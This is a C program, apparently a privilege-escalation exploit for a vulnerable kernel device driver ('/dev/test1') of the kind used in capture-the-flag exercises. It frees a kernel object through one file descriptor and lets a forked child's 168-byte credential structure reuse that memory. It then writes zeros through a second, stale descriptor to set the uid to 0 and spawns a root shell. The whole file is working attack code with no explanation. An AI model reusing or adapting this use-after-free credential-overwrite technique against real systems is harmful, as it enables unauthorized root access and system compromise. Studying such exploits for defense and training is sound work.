#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <pthread.h>

#define CRED_SIZE 168
#define DEV_NAME "/dev/test1"

char buf[100];

int main()
{
    int fd1, fd2, ret, now_uid;
    char zero_buf[100];
    memset(zero_buf, 0, sizeof(char) * 100);
    fd1 = open(DEV_NAME, O_RDWR);
    fd2 = open(DEV_NAME, O_RDWR);

    ret = ioctl(fd1, 0x10001, CRED_SIZE);

    close(fd1);

    int pid = fork();
    if (pid < 0) {
        perror("fork error");
        return 0;
    }

    if (!pid) {

        ret = write(fd2, zero_buf, 28);
        now_uid = getuid();
        if (!now_uid) {
            printf("get root done\n");

            system("/bin/sh");
            exit(0);
        } else {
            puts("failed?");
            exit(0);
        }
    } else {
        wait(NULL);
    }
    close(fd2);
    return 0;
}
